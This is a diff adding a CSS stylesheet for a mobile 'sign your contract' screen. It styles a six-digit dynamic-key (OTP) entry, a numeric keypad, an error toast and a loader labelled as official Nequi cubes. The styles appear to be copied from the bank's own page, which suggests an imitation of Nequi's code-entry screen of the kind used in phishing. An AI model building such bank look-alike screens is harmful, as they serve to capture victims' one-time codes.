@@ -1,0 +1,483 @@
+:root {
+  --purple-primary: #200020;
+  --pink-primary: #DA0081;
+  --pink-disabled: #f1bfda;
+  --gray-primary: #e5e7eb;
+  --border-gray: #d1d5db;
+  --text-gray: #555555;
+}
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  -webkit-tap-highlight-color: transparent;
+  font-family: 'Montserrat', 'Plus Jakarta Sans', -apple-system, sans-serif;
+}
+
+body {
+  background-color: #ffffff;
+  color: var(--purple-primary);
+  min-height: 100vh;
+  width: 100%;
+  overflow-x: hidden;
+}
+
+/* ========================================================
+   1. SECCIÓN TECLADO: FIRMA TU CONTRATO
+   ======================================================== */
+#sectionTeclado {
+  max-width: 420px;
+  margin: 0 auto;
+  min-height: 100vh;
+  min-height: 100dvh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 40px 20px 32px 20px;
+  box-sizing: border-box;
+  transition: opacity 0.3s ease;
+}
+
+.headerHome {
+  height: 48px;
+  width: auto;
+  margin-bottom: 24px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.headerHome svg {
+  width: 146px;
+  height: 45px;
+}
+
+#sectionTeclado h1 {
+  font-size: 24px;
+  font-weight: 700;
+  line-height: 1.25;
+  text-align: center;
+  margin-bottom: 20px;
+  color: var(--purple-primary);
+  letter-spacing: -0.3px;
+}
+
+#sectionTeclado p.screen-sub {
+  font-size: 14px;
+  font-weight: 400;
+  line-height: 1.48;
+  text-align: center;
+  color: var(--purple-primary);
+  margin-bottom: 36px;
+  max-width: 340px;
+}
+
+/* Fila de los 6 inputs OTP (w-[271px] flex justify-around mx-auto [&>input]:w-8 [&>input]:text-center [&>input]:border-b [&>input]:border-purple-primary [&>input]:h-[30px] [&>input]:text-4xl [&>input]:font-bold [&>input]:text-pink-primary) */
+.otp-inputs-row {
+  width: 271px;
+  display: flex;
+  justify-content: space-around;
+  margin: 0 auto 32px auto;
+}
+
+.otp-inputs-row input {
+  width: 32px;
+  height: 30px;
+  text-align: center;
+  border: none;
+  border-bottom: 2px solid var(--purple-primary);
+  font-size: 36px;
+  font-weight: 700;
+  color: var(--pink-primary);
+  background: transparent;
+  outline: none;
+  caret-color: transparent;
+  user-select: none;
+  padding: 0;
+  line-height: 1;
+  border-radius: 0;
+  transition: border-color 0.2s ease;
+}
+
+.otp-inputs-row input:focus {
+  outline: none;
+  border-bottom-color: var(--pink-primary);
+}
+
+/* Teclado numérico (mt-8 w-full max-w-[300px] mx-auto, flex justify-around mb-4, [&>button]:w-12 [&>button]:h-12 [&>button]:border-none [&>button]:bg-transparent [&>button]:text-4xl [&>button]:text-purple-primary [&>button]:cursor-pointer [&>button]:rounded-full) */
+#keyboard {
+  width: 100%;
+  max-width: 300px;
+  margin: 32px auto 20px auto;
+}
+
+.keyboard-row {
+  display: flex;
+  justify-content: space-around;
+  margin-bottom: 16px;
+}
+
+.keyboard-btn {
+  width: 48px;
+  height: 48px;
+  border: none;
+  background: transparent;
+  font-size: 36px;
+  font-weight: 300;
+  color: var(--purple-primary);
+  cursor: pointer;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: transform 0.1s ease, opacity 0.1s ease;
+  user-select: none;
+  touch-action: manipulation;
+  outline: none;
+  line-height: 1;
+  font-family: 'Plus Jakarta Sans', sans-serif;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+.keyboard-btn:active {
+  transform: scale(0.88);
+  opacity: 0.5;
+}
+
+.keyboard-btn.invisible {
+  width: 48px;
+  height: 48px;
+  visibility: hidden;
+  pointer-events: none;
+  cursor: default;
+  border: none;
+  background: transparent;
+  padding: 0;
+}
+
+#delete-otp {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+}
+
+#delete-otp .delete-icon {
+  width: 24px;
+  height: 24px;
+  display: block;
+  pointer-events: none;
+}
+
+.legal-notice {
+  font-size: 14px;
+  font-weight: 400;
+  line-height: 1.45;
+  text-align: center;
+  color: var(--purple-primary);
+  margin-top: 14px;
+}
+
+.legal-footer {
+  font-size: 13px;
+  font-weight: 400;
+  line-height: 1.4;
+  text-align: center;
+  color: var(--purple-primary);
+  max-width: 320px;
+  margin: 0 auto;
+}
+
+/* ========================================================
+   2. MENSAJE DE ERROR CLAVE DINÁMICA
+   ======================================================== */
+.errorMessage {
+  position: fixed;
+  top: 20px;
+  left: 16px;
+  right: 16px;
+  width: calc(100% - 32px);
+  max-width: 360px;
+  margin: 0 auto;
+  background-color: #FF3E60;
+  color: var(--purple-primary);
+  padding: 14px 18px;
+  border-radius: 12px;
+  box-shadow: 0 8px 24px rgba(255, 62, 96, 0.35);
+  z-index: 1001;
+  opacity: 0;
+  transform: translateY(-20px);
+  pointer-events: none;
+  transition: opacity 0.3s ease, transform 0.3s ease;
+  display: flex;
+  align-items: center;
+}
+
+.errorMessage.show {
+  opacity: 1;
+  transform: translateY(0);
+  pointer-events: auto;
+}
+
+.errorMessage p {
+  font-size: 13.5px;
+  line-height: 1.4;
+  color: var(--purple-primary);
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  font-weight: 500;
+  margin: 0;
+  text-align: left;
+}
+
+.errorMessage .warning-icon {
+  width: 24px;
+  height: 24px;
+  flex-shrink: 0;
+  object-fit: contain;
+  display: inline-block;
+}
+
+/* ========================================================
+   3. PANTALLA CARGANDO / PROCESANDO (CUBOS OFICIALES NEQUI)
+   ======================================================== */
+.loadingContainer {
+  display: none;
+  width: 100%;
+  min-height: 100vh;
+  min-height: 100dvh;
+  background-color: #ffffff;
+  position: fixed;
+  top: 0;
+  left: 0;
+  z-index: 9999;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 24px;
+  box-sizing: border-box;
+}
+
+.loadingContainer.active {
+  display: flex;
+}
+
+.loading-cubes-wrapper {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  text-align: center;
+  gap: 32px;
+  max-width: 320px;
+  width: 100%;
+}
+
+.nequi-loader {
+  width: 62px;
+  height: 62px;
+  position: relative;
+  display: block;
+  margin: 0 auto;
+}
+
+.cubes {
+  width: 100%;
+  height: 100%;
+  position: relative;
+}
+
+.loadingContainer .cube {
+  background-color: #da0081;
+  width: 24px;
+  height: 24px;
+  position: absolute;
+  top: 0;
+  left: 0;
+  border-radius: 5px;
+  -webkit-animation: sk-wanderingCube 1.8s ease-in-out infinite;
+  animation: sk-wanderingCube 1.8s ease-in-out infinite;
+}
+
+.loadingContainer .cube:nth-child(2) {
+  -webkit-animation-delay: -0.9s;
+  animation-delay: -0.9s;
+}
+
+@-webkit-keyframes sk-wanderingCube {
+  0% {
+    transform: rotate(0deg);
+  }
+  25% {
+    transform: translateX(34px) rotate(-90deg) scale(0.5);
+  }
+  50% {
+    transform: translateX(34px) translateY(34px) rotate(-179deg);
+  }
+  50.1% {
+    transform: translateX(34px) translateY(34px) rotate(-180deg);
+  }
+  75% {
+    transform: translateX(0px) translateY(34px) rotate(-270deg) scale(0.5);
+  }
+  100% {
+    transform: rotate(-360deg);
+  }
+}
+
+@keyframes sk-wanderingCube {
+  0% {
+    transform: rotate(0deg);
+  }
+  25% {
+    transform: translateX(34px) rotate(-90deg) scale(0.5);
+  }
+  50% {
+    transform: translateX(34px) translateY(34px) rotate(-179deg);
+  }
+  50.1% {
+    transform: translateX(34px) translateY(34px) rotate(-180deg);
+  }
+  75% {
+    transform: translateX(0px) translateY(34px) rotate(-270deg) scale(0.5);
+  }
+  100% {
+    transform: rotate(-360deg);
+  }
+}
+
+.loading-text {
+  font-family: 'Plus Jakarta Sans', 'Montserrat', sans-serif;
+  font-size: 16px;
+  font-weight: 600;
+  color: #200020;
+  line-height: 1.45;
+  margin: 0;
+  text-align: center;
+  letter-spacing: -0.15px;
+}
+
+/* ========================================================
+   ADAPTACIONES MÓVILES (TELÉFONOS Y PANTALLAS COMPACTAS)
+   ======================================================== */
+@media (max-width: 480px) {
+  #sectionTeclado {
+    padding: 24px 16px 20px 16px;
+    justify-content: flex-start;
+  }
+
+  .headerHome {
+    height: 40px;
+    margin-bottom: 16px;
+  }
+
+  .headerHome svg {
+    width: 125px;
+    height: 38px;
+  }
+
+  #sectionTeclado h1 {
+    font-size: 22px;
+    margin-bottom: 12px;
+  }
+
+  #sectionTeclado p.screen-sub {
+    font-size: 13.5px;
+    margin-bottom: 24px;
+    padding: 0 8px;
+  }
+
+  .otp-inputs-row {
+    width: 260px;
+    margin-bottom: 24px;
+  }
+
+  .otp-inputs-row input {
+    width: 28px;
+    font-size: 32px;
+  }
+
+  #keyboard {
+    max-width: 290px;
+    margin: 20px auto 16px auto;
+  }
+
+  .keyboard-row {
+    margin-bottom: 12px;
+  }
+
+  .keyboard-btn {
+    width: 46px;
+    height: 46px;
+    font-size: 32px;
+  }
+
+  .keyboard-btn.invisible {
+    width: 46px;
+    height: 46px;
+  }
+
+  .legal-footer {
+    font-size: 12px;
+    line-height: 1.35;
+    padding: 0 10px;
+  }
+
+  .loading-text {
+    font-size: 15px;
+  }
+}
+
+/* Pantallas con altura reducida (iPhone SE, modo horizontal o teclado virtual) */
+@media (max-height: 680px) {
+  #sectionTeclado {
+    padding: 16px 16px 12px 16px;
+  }
+
+  .headerHome {
+    height: 34px;
+    margin-bottom: 10px;
+  }
+
+  #sectionTeclado h1 {
+    font-size: 20px;
+    margin-bottom: 8px;
+  }
+
+  #sectionTeclado p.screen-sub {
+    font-size: 12.5px;
+    margin-bottom: 16px;
+  }
+
+  .otp-inputs-row {
+    margin-bottom: 16px;
+  }
+
+  #keyboard {
+    margin: 10px auto 10px auto;
+  }
+
+  .keyboard-row {
+    margin-bottom: 8px;
+  }
+
+  .keyboard-btn {
+    width: 42px;
+    height: 42px;
+    font-size: 28px;
+  }
+
+  .keyboard-btn.invisible {
+    width: 42px;
+    height: 42px;
+  }
+}
+
+
+
